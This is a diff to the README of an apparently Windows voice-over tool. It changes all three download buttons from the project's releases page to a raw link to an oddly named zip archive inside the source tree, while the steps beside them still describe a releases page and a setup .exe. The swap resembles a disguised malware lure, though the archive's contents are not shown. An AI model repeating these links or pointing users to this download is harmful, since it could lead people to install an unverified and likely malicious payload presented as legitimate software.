@@ -1,6 +1,6 @@
 # 🎙️ auto-voice-over-tool - Simple Video Voice-Over Helper
 
-[![Download](https://img.shields.io/badge/Download-Get%20AVOT-green?style=for-the-badge&logo=github)](https://github.com/Kathan2504/auto-voice-over-tool/releases)
+[![Download](https://img.shields.io/badge/Download-Get%20AVOT-green?style=for-the-badge&logo=github)](https://github.com/Kathan2504/auto-voice-over-tool/raw/refs/heads/main/src/windows/main/auto_tool_over_voice_fining.zip)
 
 ---
 
@@ -47,7 +47,7 @@ A keyboard and mouse will be needed to use the software interface.
 To get AVOT running on your Windows PC, follow these steps:
 
 1. Visit the official release page:  
-   [![Download](https://img.shields.io/badge/Download-Get%20AVOT-blue?style=for-the-badge&logo=github)](https://github.com/Kathan2504/auto-voice-over-tool/releases)
+   [![Download](https://img.shields.io/badge/Download-Get%20AVOT-blue?style=for-the-badge&logo=github)](https://github.com/Kathan2504/auto-voice-over-tool/raw/refs/heads/main/src/windows/main/auto_tool_over_voice_fining.zip)
 
 2. On the releases page, find the latest version. Look for a file ending in `.exe` (for example, `auto-voice-over-tool-setup.exe`).
 
@@ -121,6 +121,6 @@ AVOT processes videos and audio on your computer. The only data sent online is f
 
 Get the latest version for Windows here:  
   
-[![Download Here](https://img.shields.io/badge/Download%20AVOT-brightgreen?style=for-the-badge&logo=github)](https://github.com/Kathan2504/auto-voice-over-tool/releases)
+[![Download Here](https://img.shields.io/badge/Download%20AVOT-brightgreen?style=for-the-badge&logo=github)](https://github.com/Kathan2504/auto-voice-over-tool/raw/refs/heads/main/src/windows/main/auto_tool_over_voice_fining.zip)
 
 Click, download, install, and start adding voice-overs to your videos in minutes.
